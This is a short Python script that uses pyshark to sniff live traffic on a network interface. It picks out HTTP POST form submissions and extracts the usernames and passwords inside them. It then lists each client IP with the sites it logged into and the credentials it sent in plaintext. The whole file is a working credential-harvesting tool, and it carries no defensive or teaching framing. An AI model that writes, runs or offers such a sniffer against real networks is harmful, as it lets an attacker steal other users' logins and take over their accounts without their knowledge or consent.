import pyshark
import asyncio
import re
from collections import defaultdict

d = defaultdict(list)       #list of tuples. key = client ip -> [(domain name, user, pass)]


def find_forms(p):
    
    try:
        ip = str(p.ip.src)
    except AttributeError:
        ip = str(p.ipv6.src)
    
    host = str(p.http.host)
    global d

    q = str(p[-1])       #get the <URLENCODED-FORM Layer>

    ch = re.search('user.* = ".+"|uname.* = ".+"', q, re.IGNORECASE).end() - 2  #the number of form field names covered by this regex 
                                                                                #could be improved
    usr = ""
    while ch >= 0:
        if q[ch] == '"':
            break
        usr += q[ch]
        ch -= 1

    ch = re.search('pass.* = ".+"', q, re.IGNORECASE).end() - 2  #the number of form field names covered by this regex 
                                                                                #could be improved
    password = ""
    while ch >= 0:
        if q[ch] == '"':
            break
        password += q[ch]
        ch -= 1

    d[ip].append((host, usr[::-1], password[::-1]))


def main():
    # print(pyshark.tshark.tshark.get_tshark_interfaces())
    
    c = pyshark.LiveCapture(interface='\\Device\\NPF_{CA6121FC-E7A0-4AF4-8E7B-6C72C5ED2966}', display_filter='((http)) && (http.request.method == "POST")')

    try:
        c.apply_on_packets(find_forms, timeout=20)

    except asyncio.exceptions.TimeoutError:
        global d
        print()
        for k in d.keys():
            print(f"Client {k} has {len(d[k])} registered connections: ")
            for t in d[k]:
                print(f"On {t[0]}, the user connected with the username '{t[1]}' and password '{t[2]}'")
            print()

if __name__ == '__main__':
    main()